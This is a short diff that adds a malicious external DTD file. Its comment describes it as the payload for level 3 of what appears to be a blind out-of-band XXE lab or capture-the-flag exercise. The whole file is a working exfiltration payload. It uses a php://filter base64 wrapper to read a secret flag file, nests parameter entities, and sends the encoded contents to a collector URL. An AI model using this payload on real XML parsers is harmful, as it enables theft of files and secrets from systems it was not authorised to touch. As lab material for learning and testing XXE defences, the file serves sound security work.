@@ -1,0 +1,6 @@
+<!-- oob.dtd — malicious external DTD for Level 3 (blind out-of-band XXE).
+     Reads the secret, base64-encodes it, and ships it to the internal collector. -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/secret/flag3.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1/collector.php?data=%file;'>">
+%eval;
+%exfil;
